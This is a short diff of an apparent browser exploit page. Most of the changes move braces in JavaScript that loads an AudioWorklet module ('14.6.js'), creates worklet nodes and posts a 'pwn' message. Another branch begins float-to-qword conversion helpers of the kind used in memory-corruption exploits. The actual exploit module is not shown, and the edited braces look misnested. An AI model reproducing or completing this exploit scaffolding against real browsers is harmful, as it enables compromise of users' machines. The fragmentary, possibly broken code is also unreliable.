@@ -66,21 +66,25 @@
         			document.body.innerText += s + "\n";
       				}
 				function start () {
-					if (enumur == 2) {
-						async function start1() {
+					if (enumur == 2) 
+					{
+						async function start1() 
+						{
         						log(" starting...")
         						var context = new OfflineAudioContext(1, 128, 300000);
-        						context.audioWorklet.addModule("14.6.js").then(async () => {
+        						context.audioWorklet.addModule("14.6.js").then(async () => 
+							{
           						var wa = new AudioWorkletNode(context, "a");
           						var wb = new AudioWorkletNode(context, "b");
           						wa.port.onmessage = (e) => { log(e.data);}
           						await (new Promise((res) => setTimeout(res, 100)));
           						wa.port.postMessage("pwn");
           						//wb.port.div(d);
-        					});
+        						});
+						} 
 						start1();
-      					
-	} else if(enumur == 1) {
+						} 
+				} else if(enumur == 1) {
 	let data_view = new DataView(new ArrayBuffer(8));
         floatAsQword = float => {
             data_view.setFloat64(0, float, true);
